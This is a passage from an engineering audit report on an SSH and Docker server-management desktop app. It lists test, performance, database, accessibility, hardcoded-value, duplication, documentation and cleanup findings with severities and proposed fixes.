- `:181` `services::sync_dns(...)` — 5 supplied, 6 expected (missing `suffix: &str`)
- `:189` `services::sync_application_node_firewall(...)` — 5 supplied, 6 expected (missing `&FirewallRuleRepository`)

The production signatures gained these parameters and the test was never updated. The entire workspace test suite is red. **Nothing else in this report can be regression-tested until this is fixed.**

**F-002 — 72 clippy warnings on the library | MEDIUM | P2**
Mostly `doc_lazy_continuation` (cosmetic). Two substantive: `clippy::await_holding_lock` at `services/application_service.rs:1644` (a `MutexGuard` held across four `.await` points — test code, but a deadlock-shaped pattern), and `clippy::mem_replace_option_with_some` at `ssh/client.rs:190`. Warnings are not denied anywhere, and there is **no CI configuration in the repository at all**.

**F-005 — All 77 backend integration tests fail on any machine without Postgres | HIGH | P0**
`backend/tests/*.rs` call `common::database_url()`, which `expect()`s `DATABASE_URL`. None were marked `#[ignore]`, unlike every real-dependency test in `src-tauri/tests/`. Because cargo stops at the first failing test binary, `audit.rs` (alphabetically first) took the entire rest of `cargo test --workspace` down with it — so the workspace suite was red by default even before F-001. Fixed in Phase A alongside F-001.

**F-003 — No frontend test framework whatsoever | HIGH | P1**
`package.json` has **no** `test` script and no vitest/jest/playwright/testing-library dependency. Zero tests exist for ~18k lines of TypeScript, including the wizard flows, the file manager, the terminal, and every store. There is also no `lint` script and no `typecheck` script — `tsc --noEmit` passes but nothing enforces it.

**F-004 — Dependency vulnerabilities | MEDIUM | P1**
`npm audit`: **1 high (vite), 3 moderate (esbuild, react-router, react-router-dom)**. `cargo audit` could not be run — `cargo-audit` is not installed. Both must be run and cleared before release.

---

## 6. Test Coverage Gaps

Rust unit tests are genuinely good in several modules (`sandbox.rs`, `docker.rs`, `ufw.rs`, `dedicated_user.rs`, `database_service.rs` all have meaningful coverage of parsing and command construction). The gaps are concentrated where it matters most:

| Module | Unit | Integration | Verdict |
|---|---|---|---|
| `files/sandbox.rs` | 9 tests: `..`, null bytes, backslashes, root boundary | — | **Good** |
| `runtime/docker.rs` | ~20 tests on command construction | `tests/docker_runtime.rs` (real server) | Good on construction; **no recreate/orphan/rollback tests** |
| `firewall/ufw.rs` | parse + command tests | `tests/firewall_ufw.rs` (real server) | **No lockout test, no fail-open test** |
| `network/wireguard.rs` | `build_apply_script` tested for newlines only | `tests/vibe_network.rs` **BROKEN** | **No injection test — this is why S-002 shipped** |
| `services/dns_service.rs` | slugify/normalize tested | broken | **No collision test, no concurrent-sync test** |
| `services/database_service.rs` | identifier/password generation tested | none | **No injection test, no `%`-grant assertion** |
| `files/archive.rs` | — | — | **Zero tests. No zip-bomb, no symlink-loop, no traversal test** |
| `services/application_backup_service.rs` | — | — | **Zero tests** |
| `storage/migrations.rs` | `validate()` + 5 data-migration tests | — | Good; **no concurrent-open test** |
| `services/application_service.rs` | lifecycle test (local process only) | — | **No Docker lifecycle, no delete-teardown test** |
| Frontend (all 18k LOC) | — | — | **Zero** |

**Security tests the brief asks for that do not exist anywhere:** symlink escape, port collision, wrong-application-ID access, shell metacharacter injection into WireGuard/DNS/database, malicious env keys, invalid Node/Application/Docker-image names, unexpected Unicode, very long input, null bytes outside `sandbox.rs`, malicious ANSI sequences in terminal/log output.

**Property/fuzz testing:** none. `proptest`/`cargo-fuzz` are not dependencies. Highest-value targets: `sandbox::sanitize_relative_path`, `dns_service::normalize_alias`, `ufw::parse_added_rules`, `docker::parse_docker_byte_size`, `firewall_service::parse_ss_output`.

**Per-scenario coverage** (the brief's SUCCESS / INVALID INPUT / PERMISSION DENIED / NOT FOUND / TIMEOUT / CONNECTION LOST / PARTIAL FAILURE / RETRY / CONCURRENT / CANCEL / RESTART matrix): only SUCCESS and INVALID INPUT are covered anywhere. TIMEOUT is untestable because no timeouts exist (P-004). PARTIAL FAILURE, CONCURRENT and CANCEL have no coverage in any module.

---

## 7. Performance

**P-001 — Polling storm, ungated by window visibility | HIGH | P1**
Nine `setInterval`s. Concurrently active on a dashboard with N Nodes:

| Hook | Interval | Cost |
|---|---|---|
| `useServerMetricsPolling` | **6 s** | one SSH `execute_command` per Node |
| `useServerPinging` | **15 s** | per Node |
| `Dashboard` overview (×2) | **20 s** | per Node |
| `ApplicationDetail` | **5 s** | per open Application |
| `ApplicationConsoleCard` | **2 s** | per open console |

With 10 Nodes that is ~100 SSH round trips per minute, forever, **including while the window is minimised** — no `document.visibilityState` check exists anywhere. Each metrics call opens a fresh SSH channel.

**P-002 — `LogCaptureStore` rewrites the whole log file on every poll | HIGH | P1**
`storage/log_capture.rs::append` does read-entire-file → split to `Vec<String>` → extend → `join("\n")` → `tokio::fs::write` of the whole thing. At `MAX_STORED_LINES = 5000` that is a full ~500 KB read+write **every 2 seconds** per open console. `tail()` also reads the entire file to return N lines. Additionally: `tokio::fs::write` is **not atomic** (crash mid-write truncates the log), and there is **no lock**, so two concurrent `application_logs` calls for one Application race read-modify-write and **lose lines**.

**P-003 — `create_directory_all` is an N+1 round-trip generator | HIGH | P1**
`files/archive.rs::create_directory_all` issues one `provider.metadata()` call **per path segment, per file, per archive entry**. For the `sudo_user` provider each `metadata` is an SFTP call *plus* a full `sudo` helper invocation on a new SSH exec channel. Extracting a 5000-file plugin pack is tens of thousands of round trips.

**P-004 — No command timeout on SSH; the 60 s inactivity timeout kills long operations | HIGH | P1**
`ssh/client.rs`: `CONNECT_TIMEOUT` covers only the initial connect. `execute_command` has **no timeout at all** — a hung `apt-get` or `docker pull` blocks the calling Tauri command forever with no cancellation. Simultaneously `client::Config { inactivity_timeout: Some(60s) }` tears down the **whole session** after 60 s of silence — which a real `apt-get install mariadb-server` (S-033) will routinely exceed. These two settings are in direct conflict.

**P-005 — `execute_command` accumulates unbounded stdout in memory | MEDIUM | P2**
No cap on the `Vec<u8>` accumulators. `sudo cat` of a large file or a wide `find` fills desktop RAM.

**P-006 — Double SSH connect race, leaked sessions | MEDIUM | P1**
`SshSessionManager` has `get`/`insert`/`remove` but **no atomic get-or-insert**. Two concurrent commands for the same Node (trivially reachable: metrics poll + user opens Files) both miss the cache, both perform a full TCP+auth handshake, and one overwrites the other in the map. The loser's session is **never closed and never removed** — it leaks until process exit. `remove()` also never calls `close()`.

**P-007 — `ensure_registry_login` runs on every Application start | MEDIUM | P2**
A keyring read plus a full `docker login` round trip before every start, even when already authenticated.

**P-008 — No list virtualization | MEDIUM | P2**
No windowing library is present. File listings, container lists, process lists and log views all render every row. A directory with 10k files will freeze the UI.

**P-009 — `merge_new_log_lines` loses or duplicates log lines | MEDIUM | P1**
`application_service.rs::merge_new_log_lines` anchors on the last captured line using `rposition`. Two failure modes, both common:
- A repeated line (e.g. Minecraft's `Can't keep up!`) matches the **rightmost** occurrence, silently **dropping every line in between**. The existing test `merge_new_log_lines_uses_the_rightmost_match_when_a_line_repeats` asserts this behaviour as correct — it is not.
- If the anchor scrolled out of the tail window, the entire batch is treated as new → **duplicated lines**.

**Fix:** use Docker's `--since` timestamp (logs are already fetched with `--timestamps`) instead of content matching.

---

## 8. Database

**Schema:** 15 migrations under `rusqlite_migration`, forward-only. Foreign keys enabled on every connection. `ON DELETE CASCADE` used consistently. Sensible unique constraints (`dns_records.application_id`, `dns_records.hostname`, `registry_credentials.registry`). Indexes present where queried. **No secrets in any column** — verified across all 15 migrations and all 9 repositories, and enforced by comment convention in the migration file.

| ID | Finding | Sev | Pri |
|---|---|---|---|
| D-001 | Nine connections, no WAL, no busy_timeout, nine concurrent migrations at startup — see A-004 | HIGH | P0 |
| D-002 | `M::up`-only, **no `down` migrations** — no rollback path for a bad release | MEDIUM | P1 |
| D-003 | No checksum verification of applied migrations. `rusqlite_migration` keys on `user_version`, so **editing an existing `M::up` in place silently does nothing on existing installs** while working on fresh ones. The codebase already hit this class of bug once — `sudo_user::ensure_helper_installed`'s doc comment describes exactly it | MEDIUM | P1 |
| D-004 | `create_application_database` stores the keyring secret **after** the DB row with no rollback — a keyring failure leaves a row whose password is unrecoverable, and `reveal` then returns `Internal` forever | MEDIUM | P2 |
| D-005 | No transaction boundary spans repositories. `add_application_port` writes the port then syncs the firewall best-effort; a firewall failure leaves the DB claiming a rule that does not exist on the Node | MEDIUM | P1 |
| D-006 | Orphan rows: deleting a Server cascades Applications, but nothing reconciles the **Node-side** state — see S-007 | HIGH | P0 |
| D-007 | `application_ports` has no unique constraint on `(server_id, protocol, external_port)`; collision detection is an application-level query with a TOCTOU window against concurrent adds | MEDIUM | P2 |

---

## 9. Frontend, UI/UX and Accessibility

### 9.1 What is genuinely good
- Only **2** uses of `any` in ~18k lines.
- `tsc --noEmit` passes under full `strict` + `noUnusedLocals` + `noUnusedParameters`.
- Complete i18n: 1120/1120 keys, zero drift.
- All polling hooks use `cancelled` flags — no stale-response writes.
- Every `addEventListener` has a matching `removeEventListener`.
- Clean layering: pages → services → `callCommand`. No direct `invoke` outside `tauri.ts`.

### 9.2 Findings

**U-001 — No modal is accessible | HIGH | P1**
There are **20+** modal/dialog components. Across the entire frontend there is exactly **one** occurrence of `role="dialog"`, `aria-modal`, or `tabIndex`. Consequences: no focus trap (Tab escapes into the page behind), no focus restoration on close, no `aria-modal`, no announced dialog role, and Escape-to-close is inconsistent (`useBackdropClose` handles backdrop clicks, not keyboard).
**Fix:** one `<Modal>` primitive with focus trap, focus restore, `role="dialog" aria-modal="true"`, labelled by its heading, Escape handling. Migrate all 20+ call sites onto it.

**U-002 — Icon-only buttons lack accessible names | MEDIUM | P1**
`IconButton` is used widely for destructive and primary actions, but only 13 files contain any `aria-label`. Screen-reader users get "button" with no name.

**U-003 — Config changes silently do not apply to a running container | HIGH | P1**
`set_application_environment`, `set_application_image`, `set_application_resource_limits`, and the port add/update/remove commands all write to the DB and return success. But `DockerRuntime::start` only calls `create_container` **when the container does not already exist**, and `restart` calls `docker restart` on the existing container. So:

> The user edits an environment variable, sees a success toast, clicks Restart, watches the app restart — and the variable is unchanged.

`recreate_application` exists and does the right thing (destroy → start), but it is a separate manual action and nothing in these code paths tells the user it is required. This makes the Environment tab, Ports tab, Resource Limits card and Docker Image card **effectively non-functional for any already-running Application** — the brief's "fake UI / actions not connected" category.
**Fix:** mark the Application "configuration pending" after any of these writes, show a persistent banner offering Recreate, and explain that recreation restarts the container.
**Test required:** changing env on a running Docker app then restarting must either apply the change or surface the pending state.

**U-004 — Backend error strings shown raw, in English, with no recovery guidance | HIGH | P1**
See S-019. The user sees `connection error: docker create failed`, `invalid input: containing directory doesn't exist`, `storage error: database is locked`. No "what happened / why / what you can do" structure, no technical-details disclosure, no i18n — in an app that is otherwise fully translated.

**U-005 — Success reported for partially-failed operations | HIGH | P1**
`sync_firewall_best_effort` (log-only), `attach_console_fifo` (`let _ =`), `ensure_helper_installed` (`let _ =`), `ensure_working_directory_owned_by_dedicated_user` (`let _ =`), `ensure_mysql_*` (all `let _ =`), `wireguard::teardown` (always `Ok`). In each case the user sees success while the Node is in a different state than the UI shows.

**U-006 — Visual/responsive audit not performed | INFO | P2**
The brief asks for a visual sweep at 1920/1600/1440/1366/1280/1024/900/800. This requires a built Tauri binary and a live SSH Node; neither was available in this session. `docs/UI_AUDIT.md` exists and should be re-validated against current code in Phase F. **Treat responsive behaviour, clipping, contrast and spacing as unaudited, not as clean.**

---

## 10. Proposed Error Taxonomy

Replace `AppError`'s six string-carrying variants with a structured enum the frontend can branch on and map to a translation key:

```rust
pub enum AppError {
    // input / state
    InvalidInput { field: Option<String>, reason: InvalidReason },
    NotFound { resource: ResourceKind, id: String },
    Conflict { kind: ConflictKind },          // NameTaken, AlreadyRunning, ...

    // permission
    PermissionDenied { path: Option<String>, needs_sudo: bool },

    // environment / dependency
    RuntimeUnavailable { runtime: RuntimeType },
    DockerUnavailable,
    AgentUnavailable,
    FirewallUnavailable,                       // distinct from FirewallApplyFailed

    // transport
    ConnectionLost { host: String },
    Timeout { operation: &'static str, after: Duration },
    HostKeyMismatch { host: String },

    // operations
    FirewallApplyFailed { rule: FirewallRule, detail: String },
    DnsSyncFailed { server_id: Uuid, detail: String },
    PortInUse { port: u16, protocol: PortProtocol, owner: Option<String> },
    InvalidConfiguration { field: String, detail: String },

    Storage(StorageError),
    Internal { context: String },              // never shown raw to the user
}
```

Serialize as `{ code: "port_in_use", params: { port: 25565, owner: "nginx" }, detail: "…" }`. The frontend renders `t("errors.port_in_use", params)` and puts `detail` behind a "Technical details" disclosure. That gives the brief's required shape — *what happened / why / what you can do* — with `detail` reserved for logs and the Advanced view.

---

## 11. Hardcoded Values

### MUST FIX
| Value | Location | Why |
|---|---|---|
| `chmod 666` (console FIFO) | `runtime/docker.rs::build_attach_script` | S-004 |
| `chmod 644` (staging file) | `files/sudo_user.rs` helper script | S-005 |
| `/tmp/vibessh-wg-strip.conf` | `network/wireguard.rs` | S-003 |
| `STAGING_PREFIX = "/tmp/vibessh-stage-"` | `files/sudo_user.rs` | S-005 |
| `CONNECTIONS_FROM = "%"` | `services/database_service.rs` | S-006 |
| `"0.0.0.0"` for `VibeNetwork` visibility | `application_service.rs::resolve_bind_address` | S-001 |
| `bind-address = 0.0.0.0` | `database_service.rs::ensure_mysql_listens_on_all_interfaces` | S-006 |

### SHOULD FIX
| Value | Location |
|---|---|
| `inactivity_timeout: 60s` vs. no command timeout | `ssh/client.rs` — actively conflicting (P-004) |
| Poll intervals `2000/5000/6000/15000/20000` ms | 5 separate frontend files, no shared config (P-001) |
| `MAX_STORED_LINES = 5000` | `storage/log_capture.rs` |
| `MAX_FAILED_ATTEMPTS = 10`, pairing TTL | `agent/src/pairing/mod.rs` |
| `LISTEN_PORT = 54221`, `MESH_CIDR = 10.77.0.0/16`, `MESH_CIDR_SECOND_OCTET = 77` | `wireguard.rs`, `node_network_repository.rs` — not configurable; will collide with an existing 10.77/16 network |
| `NETWORK_NAME = "vibessh-net"` | `runtime/docker.rs` |
| `DEFAULT_BIND_ADDR = "0.0.0.0:7420"` | `agent/src/main.rs` |
| `HELPER_PATH`, `SUDOERS_PATH` | `files/sudo_user.rs` |
| `GENERATED_PASSWORD_LEN = 24`, `MAX_DATABASE_NAME_LEN`, `MAX_USERNAME_LEN` | `database_service.rs` |
| Archive size/entry/depth caps | **absent entirely** — see S-011 |

### ACCEPTABLE
Docker restart-policy allowlist; `find -printf` format strings; UFW comment marker `'vibessh'`; DNS begin/end markers; SigV4 constants; keyring service name `"VibeSSH"`; `CONNECT_TIMEOUT = 15s`.

### User-facing strings
Rust error strings are hardcoded English throughout (~200 sites) and reach the UI directly (S-019). The frontend itself is fully translated. The fix is the taxonomy in §10 — translate on the frontend by error code — **not** a giant Rust string table.

---

## 12. Duplication and Dead Code

**Duplication:**
- `shell_quote` — **thirteen** byte-identical copies (the audit first counted six; the remaining seven surfaced during the Phase A cleanup): `dedicated_user.rs`, `files/sudo_user.rs`, `runtime/docker.rs`, `runtime/remote_process.rs`, `runtime/health_check.rs`, `services/application_service.rs`, `services/database_service.rs`, `services/dns_service.rs`, and all six blueprint modules that build a launch command (`paper`, `purpur`, `velocity`, `waterfall`, `nodejs_bot`, `python_bot`). This is the direct root cause of four CRITICALs — each site independently decides what to validate.
- `reject_unsafe` / `reject_newlines` — three near-identical variants in `wireguard.rs`, `dns_service.rs`, `docker.rs`, each blocking a *different* character set.
- The connect-retry-reconnect block is copy-pasted in `firewall_service.rs` (twice), `network_service.rs`, and `dns_service.rs` instead of using `ssh_service::retry_on_connection_failure`.
- `slugify` exists in both `dns_service.rs` and `runtime/docker.rs::network_alias` with subtly different fallbacks.

**Dead code (compiler-confirmed):**
- `transport::ServerConnection` — all 20 methods (A-001).
- `FirewallProvider::current_rules` — only called from a real-server integration test.
- `backend/tests/common/mod.rs` — `delete`, `patch`, `post`, `request`, `get_with_bearer`, `post_with_bearer`, `register_user`, `unique_email` all unused.
- `src/constants/permissions.ts` — `VIEW`, `CREATE`, `EDIT`, `DELETE`, `RENAME`, `CHMOD`, `UPLOAD`, `DOWNLOAD` all unused.

None of these should be deleted without first confirming they are not reached dynamically — for the four above, the compiler has already confirmed it.

---

## 13. Documentation Consistency

- **`docs/security-review.md` is materially stale.** It states *"no code path anywhere in the agent executes a shell command with any input"* and marks command injection and path traversal as *"N/A until a feature that actually shells out exists"*. Since then the desktop has grown Docker, SFTP, sudo-helper, UFW, WireGuard and DNS modules that shell out constantly — and S-002 is exactly the injection the document says does not exist. It must be re-run and re-dated.
- **`docs/agent-privileges.md`** states the Docker-group decision is *"deferred"*. In practice `runtime/docker.rs` runs `sudo docker` through the connecting admin's broad sudo — the same root-equivalence the document was avoiding, reached by a different route, undocumented.
- **`docs/APPLICATIONS_ARCHITECTURE.md`** is accurate about the Agent gap (A-002) — good.
- **`README.md`** (47 KB) — feature claims were not line-by-line verified against code; recommend a dedicated pass in Phase G.
- No `AGENTS.md` or `CLAUDE.md` exists despite the brief referencing them.

---

## 14. Resource Cleanup Summary

| Resource | Closed correctly? |
|---|---|
| SSH sessions | **No** — `remove()` never calls `close()`; connect race leaks sessions (P-006) |
| SFTP channels | Tied to session lifetime; leak with it |
| Docker containers | **No** — orphaned on Application delete (S-007) |
| Dedicated Linux users | **No** — never removed |
| Console FIFOs | **No** — never removed |
| `/tmp` staging files | **No** — cannot be removed by the caller (S-005) |
| `/tmp/vibessh-wg-strip.conf` | Best-effort `rm -f`; leaks on failure (S-003) |
| Transfer `AbortHandle`s | Leak in the map if `clear()` is not called on the success path |
| Partial uploads | **No** — no cleanup on abort (S-031) |
| Keyring secrets | Best-effort `let _ =`; orphans persist (S-036) |
| Frontend timers/listeners | **Yes** — all balanced |
| DB connections | Held for process lifetime by design |

---

## 15. What Was Verified as Correct

Recorded so a later pass does not re-litigate it:

- Path traversal (`..`, absolute paths, backslashes, null bytes) — correctly rejected, 9 tests.
- Zip slip — correctly defended by `enclosed_name()`.
- SSH host-key TOFU — correct rejection and a genuinely good error message.
- Secrets never in SQLite — verified across all 15 migrations and 9 repositories.
- Docker container-name/ref validation — `validate_container_ref` correctly rejects shell metacharacters, with tests.
- Environment-variable key validation — `is_valid_env_key` correctly rejects `=` and leading digits.
- Firewall rules derived strictly per-Node — the specific concern raised in the brief is **not** present.
- Agent control endpoint loopback enforcement — enforced at bind time with a clear refusal message.
- Backend `JWT_SECRET` minimum-length enforcement at startup — present and correct.
- DNS `/etc/hosts` heredoc — correctly **quoted** (unlike WireGuard's).
- i18n parity, TypeScript strictness, polling stale-guards, listener balance — all clean.
